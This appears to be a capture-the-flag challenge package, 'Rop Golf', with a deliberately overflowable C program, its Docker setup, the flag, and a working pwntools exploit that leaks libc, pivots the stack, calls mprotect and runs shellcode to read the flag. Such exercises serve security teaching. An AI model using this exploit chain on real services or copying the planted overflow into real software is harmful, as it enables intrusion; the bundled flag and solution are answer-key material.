{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nRUN mv /usr/bin/socat /socat\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nRUN mv /pwn/flag.txt /pwn/$(tr -dc 'A-F0-9' < /dev/urandom | head -c32).txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN rm /usr/bin/*; rm /sbin/*; rm /usr/sbin/*; rm /bin/*;\n\nENTRYPOINT [\"/socat\", \"-s\", \"TCP-LISTEN:7002,reuseaddr,fork\", \"EXEC:/pwn/rop_golf,stderr\"]",
    "flag.txt": "gigem{r34lly_p1v071n6_7h47_574ck}",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -O0 -fno-stack-protector -no-pie\nNAME := rop_golf\nPORT := 7002\nall: $(NAME)\n\nclean: .PHONY\n\trm -f $(NAME)\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker cp $(id):/lib/x86_64-linux-gnu/libc-2.28.so - | tar xv libc-2.28.so\n\tdocker cp $(id):/lib/x86_64-linux-gnu/ld-2.28.so - | tar xv ld-2.28.so\n\tmv libc-2.28.so libc.so.6\n\tmv ld-2.28.so ld-linux-x86-64.so.2\n\t\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c libc.so.6 ld-linux-x86-64.so.2 solver-template.py\n\n.PHONY:\n\n",
    "README.md": "# Rop Golf\n\n## Description\nI keep on getting hacked by people using my shells! Now that I've deleted all the nonessential programs off my computer I should be safe... right?\n\n## Solution\nSee `solve.py`.",
    "rop_golf.c": "#include <stdio.h>\n#include <unistd.h>\n\nvoid vuln() {\n    char buf[32];\n    read(0, buf, 72);\n}\n\nvoid main() {\n    setvbuf(stdout, 0, 2, 0);\n    puts(\"hi!\");\n    vuln();\n}\n",
    "solve.py": "#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF(\"rop_golf\")\nrop = ROP(exe)\nlibc = ELF(\"./libc.so.6\")\n\ncontext.binary = exe\ncontext.terminal = \"kitty\"\ndef conn():\n    if args.REMOTE:\n        return remote(\"tamuctf.com\", 443, ssl=True, sni=\"rop-golf\")\n    elif args.GDB:\n        return gdb.debug([exe.path],gdbscript=\"c\\n\")\n    else:\n        return process([exe.path])\n\n\nCHAIN_ADDR = 0x402000\nLIBC_POP_RSP = 0x000000000002420a\nLIBC_POP_RAX = 0x3a638\nLIBC_POP_RSI = 0x000000000002440e\nLIBC_POP_RDX_POP_RSI = 0x0000000000106179\nLIBC_POP_R10 = 0x0000000000106154\nLIBC_POP_RDI = 0x0000000000023a5f\nLIBC_READ = 0xea1c0\nLIBC_MPROTECT = 0xf3c30\n\nimport time\n\ndef send_shellcode(shellcode):\n    r = conn()\n    # time.sleep(30)\n\n    payload = flat([\n        b\"A\" * 40,\n        p64(rop.rdi[0]),\n        p64(exe.got['puts']),\n        p64(exe.symbols['puts']),\n        p64(exe.symbols['vuln']),\n    ])\n    r.send(payload)\n    time.sleep(1)\n    r.recvline()\n    libc.addr = u64(r.recvline().rstrip().ljust(8,b'\\x00')) - 0x71910\n    log.info(f\"leaked libc address: {hex(libc.addr)}\")\n\n    payload = flat([\n        b\"A\" * 32,\n        p64(0x404000 - 8),\n        p64(libc.addr + LIBC_POP_RAX),\n        p64(0x404000),\n        p64(exe.symbols['vuln'] + 12),\n        p64(exe.symbols['vuln']),\n        # b\"B\"*8\n    ])\n\n    r.send(payload)\n    time.sleep(1)\n    setup_shellcode = flat([\n        p64(libc.addr + LIBC_POP_RDI),\n        p64(0x404000),\n        p64(libc.addr + LIBC_POP_RDX_POP_RSI),\n        p64(7),\n        p64(0x1000),\n        p64(libc.addr + LIBC_MPROTECT),\n        p64(libc.addr + LIBC_POP_RDI),\n        p64(0),\n        p64(libc.addr + LIBC_POP_RDX_POP_RSI),\n        p64(len(shellcode)),\n        p64(0x404200),\n        p64(libc.addr + LIBC_READ),\n        p64(0x404200),\n    ])\n\n    payload = flat([\n        p64(libc.addr + LIBC_POP_RDX_POP_RSI),\n        p64(len(setup_shellcode)),\n        p64(0x404000 + 0x20),\n        p64(libc.addr + LIBC_READ),\n        b\"B\"*40\n    ])\n\n    r.send(payload)\n    time.sleep(1)\n    r.send(setup_shellcode)\n    time.sleep(1)\n    r.send(shellcode)\n    time.sleep(1)\n\n    # good luck pwning :)\n\n    return r.recvall()\n\n\ndef main():\n    list_dir = flat([\n        asm(shellcraft.amd64.linux.open(\".\", oflag=constants.O_DIRECTORY)),\n        asm(shellcraft.amd64.linux.getdents('rax', 0x404400, 500)),\n        asm(shellcraft.write(1, 0x404400, 'rax')),\n        asm(shellcraft.exit(0))\n    ])\n    child_dirs = util.getdents.dirents(send_shellcode(list_dir))\n    print(child_dirs)\n    flag = next(x for x in child_dirs if x.endswith(\".txt\"))\n    log.info(f\"reading file {flag}\")\n    print(send_shellcode(asm(shellcraft.amd64.linux.cat(flag))))\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"rop-golf\")\np.interactive()\n",
    "category": "pwn"
}